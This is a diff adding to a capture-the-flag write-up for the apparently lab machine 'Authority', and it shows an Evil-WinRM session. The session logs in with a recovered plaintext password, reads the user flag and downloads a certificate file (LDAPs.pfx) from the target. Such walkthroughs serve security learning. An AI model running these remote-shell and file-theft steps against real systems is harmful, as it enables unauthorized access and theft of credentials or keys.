@@ -537,14 +537,69 @@ svc_ldap is memeber of remote management users
 evil-winrm -i authority.htb -u svc_ldap -p lDaP_1n_th3_cle4r!
 ```
 
-Steps to move from initial foothold to user access.
+```
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                           
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_ldap\Documents> ls
+*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cd ..
+*Evil-WinRM* PS C:\Users\svc_ldap> ls
+
+
+    Directory: C:\Users\svc_ldap
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        3/24/2023  11:27 PM                3D Objects
+d-r---        3/24/2023  11:27 PM                Contacts
+d-r---        6/28/2023   6:38 PM                Desktop
+d-r---        3/24/2023  11:27 PM                Documents
+d-r---        3/24/2023  11:27 PM                Downloads
+d-r---        3/24/2023  11:27 PM                Favorites
+d-r---        3/24/2023  11:27 PM                Links
+d-r---        3/24/2023  11:27 PM                Music
+d-r---        3/24/2023  11:27 PM                Pictures
+d-r---        3/24/2023  11:27 PM                Saved Games
+d-r---        3/24/2023  11:27 PM                Searches
+d-r---        3/24/2023  11:27 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users\svc_ldap> cd Desktop
+*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> ls
+
+
+    Directory: C:\Users\svc_ldap\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---       10/10/2026  10:59 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> type user.txt
+52ad251332b3ed1c2fcfdcf015888a08
+*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> 
+
+```
 
 ---
 ## Privilege Escalation
 
 ### Enumeration
 
-What you found that leads to root/admin.
+```
+*Evil-WinRM* PS C:\Certs> download LDAPs.pfx
+                                        
+Info: Downloading C:\Certs\LDAPs.pfx to LDAPs.pfx
+                                        
+Info: Download successful!
+
+```
 
 ### Exploitation
 
